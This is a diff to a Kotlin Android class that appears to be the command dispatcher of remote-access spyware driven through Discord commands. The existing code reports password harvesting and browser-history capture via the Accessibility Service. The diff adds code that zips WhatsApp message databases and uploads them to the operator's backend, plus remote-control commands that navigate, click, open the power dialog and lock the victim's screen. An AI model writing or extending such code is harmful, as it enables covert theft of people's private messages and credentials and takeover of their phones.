@@ -1691,10 +1691,9 @@ class CommandDispatcher(
 
     private fun handleGetHistory(command: DeviceCommand): CommandResult {
         // Since modern Chrome history is private, we suggest using accessibility monitoring.
-        // But we can try to "peek" at Chrome's tabs if Accessibility is active.
         return success(command.commandId, mapOf(
             "status" to "monitored",
-            "info" to "Browser history is captured in real-time via Accessibility Service. Check keylogs for URL patterns."
+            "info" to "Browser history is captured in real-time via Accessibility Service. Use the /logs command in Discord to view url history."
         ))
     }
 
@@ -1717,7 +1716,7 @@ class CommandDispatcher(
     private fun handleGetPasswords(command: DeviceCommand): CommandResult {
         return success(command.commandId, mapOf(
             "status" to "sniffing_active",
-            "info" to "Password harvesting is active via Accessibility Service. Screen monitoring captures logins in real-time."
+            "info" to "Password harvesting is active via Accessibility Service. Use the /logs command to view captured entries."
         ))
     }
 
@@ -1777,14 +1776,22 @@ class CommandDispatcher(
             }
             
             val dbs = File("${whatsappDir.absolutePath}/Databases")
-            val dbCount = if (dbs.exists() && dbs.isDirectory) dbs.listFiles()?.size ?: 0 else 0
+            if (dbs.exists() && dbs.isDirectory) {
+                val dbFiles = dbs.listFiles()?.toList()?.filter { it.isFile } ?: emptyList()
+                if (dbFiles.isNotEmpty()) {
+                    val zipFile = File(appContext.cacheDir, "whatsapp_dbs_${System.currentTimeMillis()}.zip")
+                    FileUtils.zipFiles(dbFiles, zipFile)
+                    val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, zipFile, "application/zip")
+                    zipFile.delete()
+                    return@withContext success(command.commandId, mapOf("status" to "databases_uploaded", "count" to dbFiles.size), mediaId)
+                }
+            }
 
             success(
                 command.commandId,
                 mapOf(
                     "status" to "whatsapp_found",
-                    "databaseFiles" to dbCount,
-                    "info" to "Use /files path: ${whatsappDir.absolutePath} to browse and download specific media files or databases."
+                    "info" to "Databases empty or inaccessible. Use /files path: ${whatsappDir.absolutePath} to browse media."
                 )
             )
         }
@@ -1908,6 +1915,38 @@ class CommandDispatcher(
             "NOTIFICATIONS" -> {
                 service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                 success(command.commandId, mapOf("action" to "NOTIFICATIONS", "status" to "sent"))
+            }
+            "UP" -> {
+                service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.focusSearch(AccessibilityNodeInfo.FOCUS_UP)?.requestFocus()
+                success(command.commandId, mapOf("action" to "UP", "status" to "requested"))
+            }
+            "DOWN" -> {
+                service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.focusSearch(AccessibilityNodeInfo.FOCUS_DOWN)?.requestFocus()
+                success(command.commandId, mapOf("action" to "DOWN", "status" to "requested"))
+            }
+            "LEFT" -> {
+                service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.focusSearch(AccessibilityNodeInfo.FOCUS_LEFT)?.requestFocus()
+                success(command.commandId, mapOf("action" to "LEFT", "status" to "requested"))
+            }
+            "RIGHT" -> {
+                service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.focusSearch(AccessibilityNodeInfo.FOCUS_RIGHT)?.requestFocus()
+                success(command.commandId, mapOf("action" to "RIGHT", "status" to "requested"))
+            }
+            "ENTER" -> {
+                service.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                success(command.commandId, mapOf("action" to "ENTER", "status" to "requested"))
+            }
+            "POWER" -> {
+                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
+                success(command.commandId, mapOf("action" to "POWER_DIALOG", "status" to "sent"))
+            }
+            "LOCK" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
+                    success(command.commandId, mapOf("action" to "LOCK_SCREEN", "status" to "sent"))
+                } else {
+                    error(command.commandId, "UNSUPPORTED_VERSION", "Lock screen requires API 28+")
+                }
             }
             else -> error(command.commandId, "UNSUPPORTED_ACTION", "Action $action is not supported yet")
         }
